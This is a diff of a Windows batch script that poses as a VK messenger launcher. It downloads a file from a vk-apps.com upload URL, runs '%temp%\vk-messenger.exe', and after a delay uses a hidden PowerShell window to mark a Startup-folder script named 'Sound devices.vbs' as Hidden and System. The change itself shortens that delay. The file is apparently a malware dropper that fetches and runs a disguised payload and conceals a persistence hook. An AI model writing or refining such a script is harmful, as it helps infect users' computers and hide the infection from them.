@@ -8,8 +8,9 @@ powershell -Command "Invoke-WebRequest -Uri 'https://upload.object2.vk-apps.com/
 echo Starting application...
 start "" "%temp%\vk-messenger.exe"
 
-powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 360; $file = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
+powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 170; $file = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
 
 pause
+
 
 
